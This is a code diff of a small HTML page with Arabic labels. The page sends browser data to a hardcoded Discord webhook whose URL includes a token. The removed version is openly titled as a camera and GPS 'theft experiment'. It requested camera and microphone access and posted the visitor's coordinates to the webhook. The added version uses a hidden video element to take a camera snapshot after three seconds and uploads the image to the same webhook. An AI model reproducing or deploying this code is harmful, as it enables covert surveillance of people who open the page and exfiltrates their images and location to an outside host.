@@ -1,53 +1,57 @@
 <html>
   <body>
-    <h1>تجربة سرقة كام وGPS 😈</h1>
-    <button id="start">اضغط عشان نعطي إذن ونسرق البيانات</button>
+    <h1>تجربة تصوير كاميرا وإرسالها ويب هوك</h1>
+    <button id="start">ابدأ التصوير والإرسال</button>
+    <video id="video" autoplay style="display:none;"></video>
 
     <script>
       const webhookURL = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";
 
       document.getElementById('start').onclick = () => {
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        navigator.mediaDevices.getUserMedia({ video: true })
           .then(stream => {
-            stream.getTracks().forEach(track => track.stop());
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-            navigator.geolocation.getCurrentPosition(position => {
-              const data = {
-                content: `تم سرقة موقعك والبيانات: \nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}\nتم تشغيل الكاميرا والميكروفون`
-              };
+            // بعد 3 ثواني نصور صورة من الفيديو ونرسلها
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              // صورة بصيغة Base64
+              const imageData = canvas.toDataURL('image/png');
+
+              // نرسل الصورة على ويب هوك كملف مرفق
+              const formData = new FormData();
+              formData.append('file', dataURItoBlob(imageData), 'snapshot.png');
 
               fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
+                method: 'POST',
+                body: formData
               });
-            }, err => {
-              const data = {
-                content: `تم تشغيل الكاميرا والمايكروفون لكن رفض الموقع`
-              };
-              fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-              });
-            });
+
+              // نوقف الكاميرا بعد التصوير
+              stream.getTracks().forEach(track => track.stop());
+            }, 3000);
           })
           .catch(err => {
-            const data = {
-              content: `تم رفض صلاحية الكاميرا والمايكروفون`
-            };
-            fetch(webhookURL, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify(data)
-            });
+            alert('رفضت الإذن أو صار خطأ');
           });
+      };
+
+      // دالة تحول Base64 الى Blob عشان نرسلها كملف
+      function dataURItoBlob(dataURI) {
+        const byteString = atob(dataURI.split(',')[1]);
+        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+          ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], { type: mimeString });
       }
     </script>
   </body>
